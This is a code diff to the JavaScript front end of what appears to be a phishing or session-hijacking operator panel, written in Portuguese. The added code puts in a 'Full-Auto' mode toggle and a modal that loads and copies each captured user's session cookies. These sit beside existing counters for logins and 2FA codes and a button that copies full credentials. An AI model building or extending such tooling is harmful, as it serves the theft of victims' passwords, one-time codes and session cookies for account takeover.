@@ -18,6 +18,13 @@ const tabConsolidado = document.getElementById("tab-consolidado");
 const tabFeed = document.getElementById("tab-feed");
 const btnAtualizar = document.getElementById("btn-atualizar");
 const btnLimpar = document.getElementById("btn-limpar");
+const btnToggleAuto = document.getElementById("btn-toggle-auto");
+const autoModeLabel = document.getElementById("auto-mode-label");
+const modalCookies = document.getElementById("modal-cookies");
+const modalCookiesTitulo = document.getElementById("modal-cookies-titulo");
+const modalCookiesJson = document.getElementById("modal-cookies-json");
+const btnFecharModalCookies = document.getElementById("btn-fechar-modal-cookies");
+const btnCopiarModalCookies = document.getElementById("btn-copiar-modal-cookies");
 const toast = document.getElementById("toast");
 const toastMsg = document.getElementById("toast-msg");
 
@@ -26,6 +33,61 @@ function showToast(msg) {
   toastMsg.textContent = msg;
   toast.classList.add("show");
   setTimeout(() => toast.classList.remove("show"), 2500);
+}
+
+function atualizarBotaoAuto() {
+  if (!btnToggleAuto || !autoModeLabel) return;
+  const isAuto = dadosAtuais.auto_mode !== false;
+  if (isAuto) {
+    autoModeLabel.textContent = "Modo Full-Auto: ATIVO";
+    btnToggleAuto.style.borderColor = "rgba(2, 215, 47, 0.4)";
+    btnToggleAuto.style.background = "rgba(2, 215, 47, 0.1)";
+    btnToggleAuto.style.color = "var(--accent-green)";
+  } else {
+    autoModeLabel.textContent = "Modo Full-Auto: PAUSADO";
+    btnToggleAuto.style.borderColor = "rgba(239, 68, 68, 0.4)";
+    btnToggleAuto.style.background = "rgba(239, 68, 68, 0.1)";
+    btnToggleAuto.style.color = "var(--danger)";
+  }
+}
+
+async function alternarModoAuto() {
+  const novoModo = !dadosAtuais.auto_mode;
+  try {
+    const res = await fetch("/api/config", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ auto_mode: novoModo })
+    });
+    const json = await res.json();
+    if (json.success) {
+      dadosAtuais.auto_mode = json.auto_mode;
+      atualizarBotaoAuto();
+      showToast(`Modo Full-Auto ${json.auto_mode ? 'ATIVADO' : 'PAUSADO (Manual)'}!`);
+    }
+  } catch (err) {
+    console.error("Erro ao alterar modo auto:", err);
+  }
+}
+
+async function abrirModalCookies(usuario) {
+  if (!modalCookies || !modalCookiesJson) return;
+  try {
+    if (modalCookiesTitulo) modalCookiesTitulo.textContent = `Cookies de Sessão — ${usuario}`;
+    modalCookiesJson.value = "Carregando cookies...";
+    modalCookies.style.display = "flex";
+
+    const res = await fetch(`/api/sessao/${encodeURIComponent(usuario)}`);
+    if (!res.ok) throw new Error("Sessão não encontrada");
+    const json = await res.json();
+    modalCookiesJson.value = JSON.stringify(json.cookies || json, null, 2);
+  } catch (err) {
+    modalCookiesJson.value = "Nenhum cookie disponível ou erro ao carregar.";
+  }
+}
+
+function fecharModalCookies() {
+  if (modalCookies) modalCookies.style.display = "none";
 }
 
 function copiarTexto(texto, rotulo = "Valor") {
@@ -109,6 +171,7 @@ function atualizarKpis() {
   if (kpiLogins) kpiLogins.textContent = dadosAtuais.totalLogins || 0;
   if (kpi2fa) kpi2fa.textContent = dadosAtuais.total2FA || 0;
   if (kpiUsuarios) kpiUsuarios.textContent = dadosAtuais.totalUsuarios || 0;
+  atualizarBotaoAuto();
 }
 
 function renderizarTabela() {
@@ -250,6 +313,12 @@ function renderizarTabela() {
                   )
                 )
               )}
+              ${(item.total_cookies > 0 || item.cookies) ? `
+                <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 5px 10px; font-size: 11px;" type="button" title="Visualizar e copiar cookies da sessão autenticada" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
+                  <span>Cookies (${item.total_cookies || 'OK'})</span>
+                </button>
+              ` : ''}
               <button class="btn btn-secondary" style="padding: 5px 10px; font-size: 11px;" type="button" title="Copiar credenciais completas" onclick="copiarTexto('${escapeQuotes(credCompleta)}', 'Credenciais completas')">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                 <span>Copiar</span>
@@ -370,6 +439,12 @@ function renderizarTabela() {
                   </button>
                 ` : ''
               )}
+              ${(item.total_cookies > 0 || item.cookies) ? `
+                <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 5px 8px; font-size: 11px;" type="button" title="Cookies de Sessão" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
+                  <span>Cookies</span>
+                </button>
+              ` : ''}
               <button class="icon-btn" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
               </button>
@@ -442,6 +517,28 @@ if (btnLimpar) {
     } catch (err) {
       console.error(err);
     }
+  });
+}
+
+if (btnToggleAuto) {
+  btnToggleAuto.addEventListener("click", alternarModoAuto);
+}
+
+if (btnFecharModalCookies) {
+  btnFecharModalCookies.addEventListener("click", fecharModalCookies);
+}
+
+if (btnCopiarModalCookies) {
+  btnCopiarModalCookies.addEventListener("click", () => {
+    if (modalCookiesJson && modalCookiesJson.value) {
+      copiarTexto(modalCookiesJson.value, "Cookies de Sessão");
+    }
+  });
+}
+
+if (modalCookies) {
+  modalCookies.addEventListener("click", (e) => {
+    if (e.target === modalCookies) fecharModalCookies();
   });
 }
 
